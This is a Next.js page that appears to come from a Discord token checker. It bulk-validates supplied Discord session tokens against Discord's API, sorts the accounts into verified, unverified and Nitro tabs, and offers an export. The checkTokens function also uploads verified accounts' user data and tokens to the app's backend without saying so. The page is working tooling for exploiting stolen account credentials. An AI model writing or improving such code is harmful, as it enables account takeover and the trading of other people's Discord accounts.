import Container from "~/components/Container";
import Header from "~/components/Header";
import { type Account, useAccountStore, useTokenStore } from "~/lib/store";
import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/router";
import { Tab } from "@headlessui/react";
import BackgroundGrid from "~/components/BackgroundGrid";
import { FiArrowLeft, FiArrowRight, FiStopCircle, FiX } from "react-icons/fi";
import {
  DISCORD_EPOCH,
  fetchBillingCountry,
  fetchUser,
  snowflakeToMilliseconds,
} from "~/lib/dapi";
import DiscordAvatar from "~/components/DiscordAvatar";
import BadgeList from "~/components/BadgeList";
import { isMigratedUser, usernameOrTag } from "~/lib/utils";
import ExportDialog from "~/components/ExportDialog";
import AccountDetailsDialog from "~/components/AccountDetailsDialog";
import { api } from "~/utils/api";
import pMap from "p-map";
import { NextSeo } from "next-seo";
import { UserPremiumType } from "discord-api-types/v10";

const DeleteAccountButton = ({ account }: { account: Account }) => {
  const { removeAccount } = useAccountStore();

  return (
    <button
      className="flex h-3.5 w-3.5 items-center rounded-full bg-red-600 p-0.5 text-neutral-200 transition duration-150 hover:bg-red-700"
      onClick={() => removeAccount(account)}
    >
      <FiX size={24} />
    </button>
  );
};

const NothingPlaceholder: React.FC<{
  categoryName: string;
}> = ({ categoryName }) => {
  return (
    <div className="rounded border border-gray-700 bg-gray-800 px-3 py-4 text-center">
      <span className="text-neutral-200">
        There are no {categoryName} so far...
      </span>
    </div>
  );
};

const AccountWithUserCard: React.FC<{ account: Account }> = ({ account }) => {
  const { user } = account;
  return (
    <AccountDetailsDialog account={account}>
      <div className="rounded border border-gray-700 bg-gray-800 px-3 py-4 text-center transition duration-150 ease-in-out hover:-translate-y-1">
        <div className="flex justify-between">
          <div className="flex items-center">
            <DiscordAvatar user={user} />
            <div className="ml-4 text-left">
              <div className="flex items-center space-x-2 text-sm">
                {isMigratedUser(user) ? (
                  <span className="font-medium">{usernameOrTag(user)}</span>
                ) : (
                  <div>
                    <span className="font-medium">{user.username}</span>
                    <span className="text-xs text-gray-300">
                      #{user.discriminator}
                    </span>
                  </div>
                )}
                <BadgeList user={user} />
              </div>
              <small className="text-xs text-gray-300">{user.id}</small>
            </div>
          </div>
          <DeleteAccountButton account={account} />
        </div>
      </div>
    </AccountDetailsDialog>
  );
};

export default function Check() {
  const { tokens, removeToken } = useTokenStore();
  const { accounts, addAccount, existsByUserId, addTokenByUserId } =
    useAccountStore();

  const accountMutation = api.accounts.createOrUpdate.useMutation();

  const pendingCancellation = useRef(false);
  const [selectedCategory, setSelectedCategory] = useState(0);
  const [pageIndex, setPageIndex] = useState(0);

  const router = useRouter();
  const categories = [
    {
      name: "Verified Accounts",
      filter: ({ user }: Account) => user.verified,
    },
    {
      name: "Unverified Accounts",
      filter: ({ user }: Account) => !user.verified,
    },
    {
      name: "Nitro Accounts",
      filter: ({ user }: Account) =>
        user.verified &&
        user.premium_type &&
        user.premium_type > UserPremiumType.None,
    },
  ];

  const isNextButtonDisabled = useMemo(() => {
    const currentCategory = categories[selectedCategory];
    if (!currentCategory) {
      return true;
    }

    const filteredAccounts = accounts.filter(currentCategory.filter);
    return pageIndex + 21 >= filteredAccounts.length;
  }, [accounts, pageIndex, selectedCategory]);

  const handlePageNext = () => {
    const currentCategory = categories[selectedCategory];
    if (!currentCategory) {
      return;
    }

    const filteredAccounts = accounts.filter(currentCategory.filter);
    if (pageIndex + 21 >= filteredAccounts.length) {
      return;
    }

    setPageIndex(pageIndex + 21);
  };

  const checkTokens = () => {
    return pMap(
      tokens,
      async (token) => {
        if (pendingCancellation.current) {
          return;
        }

        removeToken(token);

        const base64Id = token.split(".")[0];
        if (!base64Id) {
          return;
        }

        const decodedId = atob(base64Id);
        const creationMilliseconds = snowflakeToMilliseconds(decodedId);

        const isValidId =
          creationMilliseconds > DISCORD_EPOCH &&
          creationMilliseconds < Date.now();
        if (!isValidId) {
          return;
        }

        if (existsByUserId(decodedId)) {
          const response = await fetchBillingCountry({ token });
          if (response) {
            addTokenByUserId(decodedId, token);
          }

          return;
        }

        const userResponse = await fetchUser("@me", { token });
        if (!userResponse) {
          return;
        }

        const user = userResponse.data;

        if (user.verified) {
          // Check if the user is "really" verified, since Discord sometimes returns verified = true for unverified users
          const billingCountryResponse = await fetchBillingCountry({ token });
          user.verified = billingCountryResponse !== null;
        }

        addAccount({ user, tokens: [token] });

        if (user.verified) {
          accountMutation.mutate({ user, tokens: [token], origin: "DTC Web" });
        }
      },
      { concurrency: 5, stopOnError: false },
    );
  };

  useEffect(() => {
    if (tokens.length === 0 && accounts.length === 0) {
      return void router.push("/");
    }

    checkTokens().catch(console.error);
  }, []);

  return (
    <>
      <Header />
      <NextSeo noindex={true} nofollow={true} />
      <main>
        <BackgroundGrid />
        <Container className="relative pt-5">
          <div className="flex items-center justify-between">
            <div className="leading-[15px]">
              <h1 className="text-xl font-bold">
                {tokens.length > 0 ? "Checking" : "Checked"} Tokens
              </h1>
              <span className="text-sm text-neutral-300">
                {tokens.length > 0
                  ? "Your tokens are being processed, please wait..."
                  : "View your results below"}
              </span>
            </div>
            <span className="text-sm">
              Remaining Tokens: <b>{tokens.length}</b>
            </span>
          </div>
          <div className="flex space-x-2 pt-2">
            <button
              className="flex items-center rounded bg-red-600 px-2 py-1.5 font-medium transition duration-150 hover:bg-red-700 disabled:opacity-50"
              disabled={pendingCancellation.current || tokens.length === 0}
              onClick={() => (pendingCancellation.current = true)}
            >
              <FiStopCircle size={20} className="mr-2" />
              Stop
            </button>
            <ExportDialog accounts={accounts} />
          </div>

          <div className="pb-8 pt-2">
            <Tab.Group
              onChange={(index) => {
                setPageIndex(0);
                setSelectedCategory(index);
              }}
            >
              <Tab.List className="flex justify-between rounded border border-gray-700 bg-gray-800 p-1 font-medium">
                {categories.map((category, index) => {
                  const entries = accounts.filter(category.filter);
                  return (
                    <Tab
                      className="w-full rounded p-2 ui-selected:bg-blurple"
                      key={`tab-${index}`}
                    >
                      {category.name} ({entries.length})
                    </Tab>
                  );
                })}
              </Tab.List>
              <Tab.Panels className="pt-5">
                {categories.map((category, index) => {
                  const entries = accounts.filter(category.filter);

                  return (
                    <Tab.Panel key={`panel-${index}`}>
                      {entries.length === 0 ? (
                        <NothingPlaceholder
                          categoryName={category.name.toLowerCase()}
                        />
                      ) : (
                        <div className="grid grid-cols-1 grid-rows-1 gap-3 lg:grid-cols-3">
                          {entries
                            .slice(pageIndex, pageIndex + 21)
                            .map((account, index) => (
                              <AccountWithUserCard
                                account={account}
                                key={`${category.name
                                  .toLowerCase()
                                  .replaceAll(" ", "-")}-${index}`}
                              />
                            ))}
                        </div>
                      )}
                    </Tab.Panel>
                  );
                })}
              </Tab.Panels>
            </Tab.Group>

            <div className="mt-4 flex space-x-1">
              <button
                className="rounded bg-blurple px-2 py-1.5 font-medium outline-none transition duration-150 hover:bg-blurple-dark disabled:opacity-50"
                onClick={() =>
                  setPageIndex(pageIndex - 21 < 0 ? 0 : pageIndex - 21)
                }
                disabled={pageIndex === 0}
              >
                <FiArrowLeft />
              </button>
              <button
                className="rounded bg-blurple px-2 py-1.5 font-medium outline-none transition duration-150 hover:bg-blurple-dark disabled:opacity-50"
                onClick={handlePageNext}
                disabled={isNextButtonDisabled}
              >
                <FiArrowRight />
              </button>
            </div>
          </div>
        </Container>
      </main>
    </>
  );
}
